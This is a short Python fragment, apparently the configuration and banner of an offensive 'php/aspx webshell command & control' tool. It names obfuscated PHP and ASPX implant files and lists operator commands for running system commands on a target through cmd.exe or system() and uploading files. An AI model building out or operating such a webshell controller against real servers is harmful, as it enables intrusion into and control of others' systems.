
PSEUDO_SHELL = "USERNAME@HOST: PWD]$ "
PHP_AGENT = "implant/php_obf_agent.php"
ASPX_AGENT = "implant/csharp_clear_agent.aspx"
OUTPUT_DIR = "output/"

help_banner ="""
    [>] Built-in commands:
    ---------------------------------------
    :shell                   --  execute a system command onto target, using cmd.exe /c (aspx) or dangerous functions such as system() (php)
    :upload                  --  upload a file to the remote target (:upload LOCAL_PATH REMOTE_PATH)
    :username                --  get current username from remote target
    :hostname                --  display remote target's hostname
    :pwd                     --  print working directory of the remote target
    """

def banner():
    print()
    print("██   ██  ██████  ██████  ███████  █████  ")
    print("██   ██ ██    ██ ██   ██ ██      ██   ██ ")
    print("███████ ██    ██ ██████  ███████ ███████ ")
    print("██   ██ ██    ██ ██   ██      ██ ██   ██ ")
    print("██   ██  ██████  ██   ██ ███████ ██   ██ ")
    print("+ php/aspx webshell command & control +")
    print()